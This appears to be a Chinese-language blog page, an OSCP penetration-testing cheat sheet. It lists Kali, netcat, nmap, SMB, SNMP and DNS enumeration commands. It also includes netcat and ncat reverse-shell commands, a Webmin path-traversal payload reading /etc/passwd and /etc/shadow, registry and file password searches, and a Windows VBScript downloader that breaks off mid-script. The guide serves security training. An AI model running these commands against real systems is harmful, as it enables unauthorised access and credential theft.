@@ -1,0 +1,1913 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="OSCP指南, wiki">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>OSCP指南 | wiki</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">wiki</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">wiki</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('本文章暂不公开')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">OSCP指南</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/OSCP/">
+                                <span class="chip bg-color">OSCP</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-09-01
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    4.4k
+                </div>
+                
+
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="OSCP指南"><a href="#OSCP指南" class="headerlink" title="OSCP指南"></a>OSCP指南</h1><h2 id="1、kali-linux"><a href="#1、kali-linux" class="headerlink" title="1、kali linux"></a>1、kali linux</h2><h3 id="1-1-开启服务"><a href="#1-1-开启服务" class="headerlink" title="1.1 开启服务"></a>1.1 开启服务</h3><pre><code>systemctl start ssh
+systemctl start apache2</code></pre><p>开机自启服务</p>
+<pre><code>systemctl enable ssh</code></pre><p>下载网页</p>
+<pre><code>wget http://www.cisco.com</code></pre><p>打开网页</p>
+<pre><code>curl http://www.cisco.com</code></pre><h3 id="1-2-使用Kali解码"><a href="#1-2-使用Kali解码" class="headerlink" title="1.2 使用Kali解码"></a>1.2 使用Kali解码</h3><ul>
+<li>解码Base64编码值<code>echo -n &quot;QWxhZGRpbjpvcGVuIHNlc2FtZQ==&quot; | base64 --decode</code></li>
+<li>解码十六进制编码值<code>echo -n &quot;46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874&quot; | xxd -r -ps</code></li>
+</ul>
+<h3 id="1-3-Netcat"><a href="#1-3-Netcat" class="headerlink" title="1.3 Netcat"></a>1.3 Netcat</h3><p>读写TCP和UDP数据包</p>
+<ul>
+<li>连接到POP3邮件服务器<br><code>nc -nv $ip 110</code></li>
+<li>侦听TCP / UDP端口<br><code>nc -nlvp 4444</code></li>
+<li>连接到netcat端口<br><code>nc -nv $ip 4444</code></li>
+<li>使用netcat发送文件<br><code>nc -nv $ip 4444 &lt; /usr/share/windows-binaries/wget.exe</code></li>
+<li>使用netcat接收文件<br><code>nc -nlvp 4444 &gt; incoming.exe</code></li>
+<li>在Linux上使用bash使用Ncat创建反向Shell<br><code>nc -nv $ip 4444 -e /bin/bash</code></li>
+</ul>
+<h3 id="1-4-Ncat"><a href="#1-4-Ncat" class="headerlink" title="1.4 Ncat"></a>1.4 Ncat</h3><p>用于Nmap的Netcat项目，可提供更高的安全性，避免IDS</p>
+<ul>
+<li>使用SSL使用cmd.exe从Windows反转外壳<br><code>ncat --exec cmd.exe --allow $ip -vnl 4444 --ssl</code></li>
+<li>使用SSL侦听端口4444<br><code>ncat -v $ip 4444 --ssl</code></li>
+</ul>
+<h3 id="1-5-Wireshark"><a href="#1-5-Wireshark" class="headerlink" title="1.5 Wireshark"></a>1.5 Wireshark</h3><ul>
+<li><p>仅显示SMTP（端口25）和ICMP流量：</p>
+<p><code>tcp.port eq 25 or icmp</code></p>
+</li>
+<li><p>仅显示工作站和服务器之间的LAN（192.168.xx）中的流量-无Internet：</p>
+<p><code>ip.src==192.168.0.0/16 and ip.dst==192.168.0.0/16</code></p>
+</li>
+<li><p>按协议过滤（例如SIP）并过滤掉不需要的IP：</p>
+<p><code>ip.src != xxx.xxx.xxx.xxx &amp;&amp; ip.dst != xxx.xxx.xxx.xxx &amp;&amp; sip</code></p>
+</li>
+<li><p>有些命令是相等的</p>
+<p><code>ip.addr == xxx.xxx.xxx.xxx</code></p>
+<p>等于</p>
+<p><code>ip.src == xxx.xxx.xxx.xxx or ip.dst == xxx.xxx.xxx.xxx</code></p>
+<p><code>ip.addr != xxx.xxx.xxx.xxx</code></p>
+<p>等于</p>
+<p><code>ip.src != xxx.xxx.xxx.xxx or ip.dst != xxx.xxx.xxx.xxx</code></p>
+</li>
+</ul>
+<h2 id="2、信息搜集"><a href="#2、信息搜集" class="headerlink" title="2、信息搜集"></a>2、信息搜集</h2><h3 id="2-1-被动信息搜集"><a href="#2-1-被动信息搜集" class="headerlink" title="2.1 被动信息搜集"></a>2.1 被动信息搜集</h3><ul>
+<li><p>google hack</p>
+</li>
+<li><p>SSL证书测试<br><a href="http://web.archive.org/web/20171113221652/https://www.ssllabs.com/ssltest/analyze.html" target="_blank" rel="noopener">https://www.ssllabs.com/ssltest/analyze.html</a></p>
+</li>
+<li><p>电子邮件收集</p>
+<ul>
+<li><p>只需发送电子邮件<br><code>git clone https://github.com/killswitch-GUI/SimplyEmail.git</code></p>
+<p><code>./SimplyEmail.py -all -e TARGET-DOMAIN</code></p>
+</li>
+</ul>
+</li>
+<li><p>LDAP</p>
+<ul>
+<li>LDAP空绑定<br><code>ldapsearch -x -b &quot;ou=anonymous,dc=challenge01,dc=root-me,dc=org&quot; -H &quot;ldap://challenge01.root-me.org:54013&quot;</code></li>
+</ul>
+</li>
+<li><p>Netcraft</p>
+<ul>
+<li>确定用于构建站点的操作系统和工具<br><a href="http://web.archive.org/web/20171113221652/https://searchdns.netcraft.com/" target="_blank" rel="noopener">https://searchdns.netcraft.com/</a></li>
+</ul>
+</li>
+<li><p>Whois枚举<br><code>whois domain-name-here.com</code></p>
+</li>
+</ul>
+<h3 id="2-2-主动信息搜集"><a href="#2-2-主动信息搜集" class="headerlink" title="2.2 主动信息搜集"></a>2.2 主动信息搜集</h3><blockquote>
+<p>$ip是变量</p>
+</blockquote>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><table>
+<thead>
+<tr>
+<th>/</th>
+<th align="center">IP地址个数</th>
+<th align="center">主机个数</th>
+<th align="center">掩码</th>
+<th align="center">C段个数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>/30</td>
+<td align="center">4</td>
+<td align="center">2</td>
+<td align="center">255.255.255.252</td>
+<td align="center">1/64</td>
+</tr>
+<tr>
+<td>/29</td>
+<td align="center">8</td>
+<td align="center">6</td>
+<td align="center">255.255.255.248</td>
+<td align="center">1/32</td>
+</tr>
+<tr>
+<td>/28</td>
+<td align="center">16</td>
+<td align="center">14</td>
+<td align="center">255.255.255.240</td>
+<td align="center">1/16</td>
+</tr>
+<tr>
+<td>/27</td>
+<td align="center">32</td>
+<td align="center">30</td>
+<td align="center">255.255.255.224</td>
+<td align="center">1/8</td>
+</tr>
+<tr>
+<td>/26</td>
+<td align="center">64</td>
+<td align="center">62</td>
+<td align="center">255.255.255.192</td>
+<td align="center">1/4</td>
+</tr>
+<tr>
+<td>/25</td>
+<td align="center">128</td>
+<td align="center">126</td>
+<td align="center">255.255.255.128</td>
+<td align="center">1/2</td>
+</tr>
+<tr>
+<td>/24</td>
+<td align="center">256</td>
+<td align="center">254</td>
+<td align="center">255.255.255.0</td>
+<td align="center">1</td>
+</tr>
+<tr>
+<td>/23</td>
+<td align="center">512</td>
+<td align="center">510</td>
+<td align="center">255.255.254.0</td>
+<td align="center">2</td>
+</tr>
+<tr>
+<td>/22</td>
+<td align="center">1024</td>
+<td align="center">1022</td>
+<td align="center">255.255.252.0</td>
+<td align="center">4</td>
+</tr>
+<tr>
+<td>/21</td>
+<td align="center">2048</td>
+<td align="center">2046</td>
+<td align="center">255.255.248.0</td>
+<td align="center">8</td>
+</tr>
+<tr>
+<td>/20</td>
+<td align="center">4096</td>
+<td align="center">4094</td>
+<td align="center">255.255.240.0</td>
+<td align="center">16</td>
+</tr>
+<tr>
+<td>/19</td>
+<td align="center">8192</td>
+<td align="center">8190</td>
+<td align="center">255.255.224.0</td>
+<td align="center">32</td>
+</tr>
+<tr>
+<td>/18</td>
+<td align="center">16384</td>
+<td align="center">16382</td>
+<td align="center">255.255.192.0</td>
+<td align="center">64</td>
+</tr>
+<tr>
+<td>/17</td>
+<td align="center">32768</td>
+<td align="center">32766</td>
+<td align="center">255.255.128.0</td>
+<td align="center">128</td>
+</tr>
+<tr>
+<td>/16</td>
+<td align="center">65536</td>
+<td align="center">65534</td>
+<td align="center">255.255.0.0</td>
+<td align="center">256</td>
+</tr>
+</tbody></table>
+<ul>
+<li><p>Nmap端口扫描</p>
+<p>nmap -A -T4 -p80 $ip</p>
+</li>
+<li><p>Netcat端口扫描</p>
+<p>nc -nvv -w 1 -z $ip 3388-3390</p>
+</li>
+<li><p>ARP扫描</p>
+<p>arp-scan $ip/24</p>
+</li>
+<li><p>使用SYN进行Nmap隐形扫描<br><code>nmap -sS $ip</code></p>
+</li>
+<li><p>使用FIN进行Nmap隐形扫描<br><code>nmap -sF $ip</code></p>
+</li>
+<li><p>Nmap OS指纹识别<br><code>nmap -O $ip</code></p>
+</li>
+<li><p>Nmap常规扫描：<br><code>nmap $ip/24</code></p>
+</li>
+<li><p>枚举扫描<br><code>nmap -p 1-65535 -sV -sS -A -T4 $ip/24 -oN nmap.txt</code></p>
+</li>
+<li><p>枚举扫描所有端口TCP / UDP并输出到txt文件<br><code>nmap -oN nmap2.txt -v -sU -sS -p- -A -T4 $ip</code></p>
+</li>
+<li><p>Nmap输出到文件：<br><code>nmap -oN nmap.txt -p 1-65535 -sV -sS -A -T4 $ip/24</code></p>
+</li>
+<li><p>快速扫描：<br><code>nmap -T4 -F $ip/24</code></p>
+</li>
+<li><p>快速扫描增强版：<br><code>nmap -sV -T4 -O -F --version-light $ip/24</code></p>
+</li>
+<li><p>快速跟踪路线<br><code>nmap -sn --traceroute $ip</code></p>
+</li>
+<li><p>所有TCP和UDP端口<br><code>nmap -v -sU -sS -p- -A -T4 $ip</code></p>
+</li>
+<li><p>强烈扫描：<br><code>nmap -T4 -A -v $ip</code></p>
+</li>
+<li><p>强烈扫描加UDP<br><code>nmap -sS -sU -T4 -A -v $ip/24</code></p>
+</li>
+<li><p>密集扫描所有TCP端口<br><code>nmap -p 1-65535 -T4 -A -v $ip/24</code></p>
+</li>
+<li><p>强烈扫描-无Ping<br><code>nmap -T4 -A -v -Pn $ip/24</code></p>
+</li>
+<li><p>ping扫描</p>
+<p>nmap -sn $ip/24</p>
+</li>
+<li><p>缓慢的全面扫描<br><code>nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script &quot;default or (discovery and safe)&quot; $ip/24</code></p>
+</li>
+<li><p>使用活动连接进行扫描，以清除旨在欺骗您的所有欺骗端口<br><code>nmap -p1-65535 -A -T5 -sT $ip</code></p>
+</li>
+</ul>
+<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><strong>DNS枚举</strong></p>
+<ul>
+<li><p>NMAP DNS主机名查找</p>
+<p><code>nmap -F --dns-server &lt;dns server ip&gt; &lt;target ip range&gt;</code></p>
+</li>
+<li><p>主机查询<br><code>host -t ns megacorpone.com</code></p>
+</li>
+<li><p>反向查找蛮力-查找相同范围内的域<br><code>for ip in $(seq 155 190);do host 50.7.67.$ip;done |grep -v &quot;not found&quot;</code></p>
+</li>
+<li><p>执行DNS IP查找<br><code>dig a domain-name-here.com @nameserver</code></p>
+</li>
+<li><p>DNS区域传输<br>Windows DNS区域传输</p>
+<pre><code>nslookup -&gt; set type=any -&gt; ls -d blah.com</code></pre><p>Linux DNS区域传输</p>
+<pre><code>dig axfr blah.com @ns1.blah.com</code></pre></li>
+<li><p>DNS枚举<br><code>dnsenum zonetransfer.me</code></p>
+</li>
+<li><p>Nmap端口版本检测最大功率<br><code>nmap -vvv -A --reason --script=&quot;+(safe or default) and not broadcast&quot; -p &lt;port&gt; &lt;host&gt;</code></p>
+</li>
+<li><p>NFS（网络文件系统）枚举</p>
+<ul>
+<li>显示可挂载的NFS共享 <code>nmap -sV --script=nfs-showmount $ip</code></li>
+</ul>
+</li>
+<li><p>RPC（远程过程调用）枚举</p>
+<ul>
+<li>无需用户名和密码即可连接到RPC共享并枚举特权 <code>rpcclient --user=&quot;&quot; --command=enumprivs -N $ip</code></li>
+<li>使用用户名连接到RPC共享并枚举特权 <code>rpcclient --user=&quot;&lt;Username&gt;&quot; --command=enumprivs $ip</code></li>
+</ul>
+</li>
+<li><p>SMB枚举</p>
+<ul>
+<li><p>SMB OS发现<br><code>nmap $ip --script smb-os-discovery.nse</code></p>
+</li>
+<li><p>Nmap端口扫描<br><code>nmap -v -p 139,445 -oG smb.txt $ip-254</code></p>
+</li>
+<li><p>Netbios信息扫描<br><code>nbtscan -r $ip/24</code></p>
+</li>
+<li><p>Nmap查找暴露的Netbios服务器<br><code>nmap -sU --script nbstat.nse -p 137 $ip</code></p>
+</li>
+<li><p>Nmap所有SMB脚本扫描</p>
+<p><code>nmap -sV -Pn -vv -p 445 --script=&#39;(smb*) and not (brute or broadcast or dos or external or fuzzer)&#39; --script-args=unsafe=1 $ip</code></p>
+</li>
+<li><p>Nmap对所有SMB脚本进行身份验证扫描</p>
+<p><code>nmap -sV -Pn -vv -p 445 --script-args smbuser=&lt;username&gt;,smbpass=&lt;password&gt; --script=&#39;(smb*) and not (brute or broadcast or dos or external or fuzzer)&#39; --script-args=unsafe=1 $ip</code></p>
+</li>
+<li><p>SMB枚举工具<br><code>nmblookup -A $ip</code></p>
+<p><code>smbclient //MOUNT/share -I $ip -N</code></p>
+<p><code>rpcclient -U &quot;&quot; $ip</code></p>
+<p><code>enum4linux $ip</code></p>
+<p><code>enum4linux -a $ip</code></p>
+</li>
+<li><p>SMB指纹识别<br><code>smbclient -L //$ip</code></p>
+</li>
+<li><p>Nmap扫描打开的SMB共享<br><code>nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.10.0/24</code></p>
+</li>
+<li><p>Nmap扫描易受攻击的SMB服务器<br><code>nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 $ip</code></p>
+</li>
+<li><p>Nmap列出所有已安装的SMB脚本<br><code>ls -l /usr/share/nmap/scripts/smb*</code></p>
+</li>
+<li><p>枚举SMB用户</p>
+<p><code>nmap -sU -sS --script=smb-enum-users -p U:137,T:139 $ip-14</code></p>
+<p>要么</p>
+<p><code>python /usr/share/doc/python-impacket-doc/examples /samrdump.py $ip</code></p>
+</li>
+<li><p>RID循环-空会话<br><code>ridenum.py $ip 500 50000 dict.txt</code></p>
+</li>
+<li><p>手动空会话测试</p>
+<p>视窗： <code>net use \\$ip\IPC$ &quot;&quot; /u:&quot;&quot;</code></p>
+<p>Linux： <code>smbclient -L //$ip</code></p>
+</li>
+</ul>
+</li>
+<li><p>SMTP枚举-邮件服务器</p>
+<ul>
+<li>使用Netcat验证SMTP端口<br><code>nc -nv $ip 25</code></li>
+</ul>
+</li>
+<li><p>POP3枚举-阅读其他人的邮件-您可能会找到电子邮件帐户的用户名和密码，因此这是使用Telnet检查邮件的方法</p>
+<pre><code> root@kali:~# telnet $ip 110
+ +OK beta POP3 server (JAMES POP3 Server 2.3.2) ready 
+ USER billydean    
+ +OK
+ PASS password
+ +OK Welcome billydean
+
+ list
+
+ +OK 2 1807
+ 1 786
+ 2 1021
+
+ retr 1
+
+ +OK Message follows
+ From: jamesbrown@motown.com
+ Dear Billy Dean,
+
+ Here is your login for remote desktop ... try not to forget it this time!
+ username: billydean
+ password: PA$$W0RD!Z</code></pre></li>
+<li><p>SNMP枚举-简单的网络管理协议</p>
+<ul>
+<li>修复SNMP输出值，使它们易于阅读<br><code>apt-get install snmp-mibs-downloader download-mibs</code> <code>echo &quot;&quot; &gt; /etc/snmp/snmp.conf</code></li>
+<li>SNMP枚举命令<ul>
+<li><code>snmpcheck -t $ip -c public</code></li>
+<li><code>snmpwalk -c public -v1 $ip 1|</code></li>
+<li><code>grep hrSWRunName|cut -d\* \* -f</code></li>
+<li><code>snmpenum -t $ip</code></li>
+<li><code>onesixtyone -c names -i hosts</code></li>
+</ul>
+</li>
+<li>SNMPv3枚举<br><code>nmap -sV -p 161 --script=snmp-info $ip/24</code></li>
+<li>自动化SNMPv3的用户名枚举过程：<br><code>apt-get install snmp snmp-mibs-downloader</code> <code>wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb</code></li>
+<li>SNMP默认凭据<br>/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt</li>
+</ul>
+</li>
+<li><p>MS SQL Server枚举</p>
+<ul>
+<li><p>Nmap信息收集</p>
+<p><code>nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER $ip</code></p>
+</li>
+</ul>
+</li>
+<li><p>Webmin和miniserv / 0.01枚举-端口10000</p>
+<p>通过抓住/ etc / passwd测试LFI和文件泄露漏洞</p>
+<pre><code>`curl http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd`</code></pre><p>通过获取/ etc / shadow来测试webmin是否以root用户身份运行</p>
+<pre><code>`curl http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow`
+</code></pre></li>
+<li><p>Linux OS枚举</p>
+<ul>
+<li>列出所有SUID文件<br><code>find / -perm -4000 2&gt;/dev/null</code></li>
+<li>确定当前的Linux版本<br><code>cat /etc/issue</code></li>
+<li>确定有关环境的更多信息<br><code>uname -a</code></li>
+<li>列出正在运行的进程<br><code>ps -xaf</code></li>
+<li>列出允许（和禁止）调用的命令<br><code>sudo -l</code></li>
+<li>列出iptables规则<br><code>iptables --table nat --list iptables -vL -t filter iptables -vL -t nat iptables -vL -t mangle iptables -vL -t raw iptables -vL -t security</code></li>
+</ul>
+</li>
+<li><p>Windows操作系统枚举</p>
+</li>
+<li><p>net config Workstation 配置工作站</p>
+</li>
+<li><p>systeminfo | findstr /B /C:”OS Name” /C:”OS Version”</p>
+</li>
+<li><p>hostname</p>
+</li>
+<li><p>net users</p>
+</li>
+<li><p>ipconfig /all</p>
+</li>
+<li><p>route print</p>
+</li>
+<li><p>arp -A</p>
+</li>
+<li><p>netstat -ano</p>
+</li>
+<li><p>netsh firewall show state           </p>
+</li>
+<li><p>netsh firewall show config</p>
+</li>
+<li><p>schtasks /query /fo LIST /v</p>
+</li>
+<li><p>tasklist /SVC</p>
+</li>
+<li><p>net start</p>
+</li>
+<li><p>findstr /si password *.xml *.ini *.txt</p>
+<p>从指定文件类型中查询密码</p>
+</li>
+<li><p>reg query HKLM /f password /t REG_SZ /s</p>
+<p>注册表中查询密码</p>
+</li>
+<li><p>reg query HKCU /f password /t REG_SZ /s</p>
+<p>注册表中查询密码</p>
+</li>
+</ul>
+<h3 id="HTTP枚举"><a href="#HTTP枚举" class="headerlink" title="HTTP枚举"></a>HTTP枚举</h3><h2 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h2><h2 id="shells"><a href="#shells" class="headerlink" title="shells"></a>shells</h2><h4 id="网络有效载荷"><a href="#网络有效载荷" class="headerlink" title="网络有效载荷"></a>网络有效载荷</h4><h4 id="脚本有效载荷"><a href="#脚本有效载荷" class="headerlink" title="脚本有效载荷"></a>脚本有效载荷</h4><h4 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h4><h2 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h2><p>后期攻击是指攻击者在对目标获得某种程度的控制后所执行的操作。</p>
+<ul>
+<li><p>简单的本地Web服务器</p>
+<ul>
+<li>运行基本的http服务器，非常适合提供shell等服务<br>python -m SimpleHTTPServer 80</li>
+<li>运行基本的Python3 http服务器，非常适合提供shell等<br>python3 -m http.server</li>
+<li>运行ruby webrick基本的http服务器<br>ruby -rwebrick -e“ WEBrick :: HTTPServer.new<br>（：Port =&gt; 80，：DocumentRoot =&gt; Dir.pwd）.start”</li>
+<li>运行基本的PHP http服务器<br>php -S $ ip：80</li>
+</ul>
+</li>
+<li><p>在Windows上创建wget VB脚本：<a href="http://web.archive.org/web/20171113221652/https://github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt" target="_blank" rel="noopener"><em>https</em></a> :<br><a href="http://web.archive.org/web/20171113221652/https://github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt" target="_blank" rel="noopener"><em>//github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt</em></a></p>
+</li>
+<li><p>可以粘贴到命令行的Windows文件传输脚本。没有Meterpreter外壳，将文件传输到Windows机器可能很棘手。可以将以下脚本复制并粘贴到基本的Windows反向窗口中，并用于从Web服务器传输文件（每行之后都需要timeout 1命令）：</p>
+<pre><code> echo Set args = Wscript.Arguments  &gt;&gt; webdl.vbs
+ timeout 1
+ echo Url = &quot;http://1.1.1.1/windows-privesc-check2.exe&quot;  &gt;&gt; webdl.vbs
+ timeout 1
+ echo dim xHttp: Set xHttp = createobject(&quot;Microsoft.XMLHTTP&quot;)  &gt;&gt; webdl.vbs
+ timeout 1
+ echo dim bStrm: Set bStrm = createobject(&quot;Adodb.Stream&quot;)  &gt;&gt; webdl.vbs
+ timeout 1
+ echo xHttp.Open &quot;GET&quot;, Url, False  &gt;&gt; webdl.vbs
+ timeout 1
+ echo xHttp.Send  &gt;&gt; webdl.vbs
+ timeout 1
+ echo with bStrm      &gt;&gt; webdl.vbs
+ timeout 1
+ echo     .type = 1 &#39;      &gt;&gt; webdl.vbs
+ timeout 1
+ echo     .open      &gt;&gt; webdl.vbs
+ timeout 1
+ echo     .write xHttp.responseBody      &gt;&gt; webdl.vbs
+ timeout 1
+ echo     .savetofile &quot;C:\temp\windows-privesc-check2.exe&quot;, 2 &#39;  &gt;&gt; webdl.vbs
+ timeout 1
+ echo end with &gt;&gt; webdl.vbs
